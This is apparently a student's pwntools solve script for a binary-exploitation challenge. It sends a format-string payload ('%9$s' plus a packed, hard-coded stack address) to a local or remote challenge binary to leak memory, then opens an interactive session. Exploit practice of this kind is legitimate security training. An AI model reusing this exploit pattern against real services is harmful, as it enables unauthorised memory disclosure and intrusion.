
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    context.arch = 'amd64'
    
    target_address = 0x7fffffffd9f0

    payload = b"%9$s"  # Format specifier
    payload += b"\x00" * (8 - len(payload) % 8)  # Pad to align to 8 bytes
    payload += p64(target_address) + p64(0x00) + b"\n"
    context.log_level = 'debug'
    with open("payload.bin", "wb") as f:
        f.write(payload)
    # write your payload here
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"4")
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

